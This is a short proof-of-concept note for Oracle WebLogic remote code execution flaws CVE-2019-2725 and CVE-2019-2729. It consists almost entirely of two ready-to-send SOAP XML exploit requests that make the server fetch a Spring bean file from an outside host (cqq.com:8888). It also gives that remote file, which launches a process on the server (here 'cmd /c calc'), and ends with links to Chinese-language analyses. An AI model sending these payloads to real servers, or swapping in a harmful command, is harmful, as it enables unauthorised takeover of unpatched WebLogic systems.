### CVE-2019-2725_v10
poc:
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java>
<class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
<void>
<string>
http://cqq.com:8888/spel2.xml
</string>
</void>
</class>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

### CVE-2019-2729_v10

poc:
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java>
<array method="forName">
<string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
<void>
<string>
http://cqq.com:8888/spel2.xml
</string>
</void>
</array>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```



其中spel2.xml文件内容：
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```


参考：
- [Weblogic-CVE-2019-2725分析通杀poc](https://p0rz9.github.io/2019/05/22/Weblogic-CVE-2019-2725%E5%88%86%E6%9E%90%E9%80%9A%E6%9D%80poc/)
- [Weblogic-CVE-2019-2725-通杀payload](http://www.lmxspace.com/2019/05/15/Weblogic-CVE-2019-2725-%E9%80%9A%E6%9D%80payload/)
- [WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)
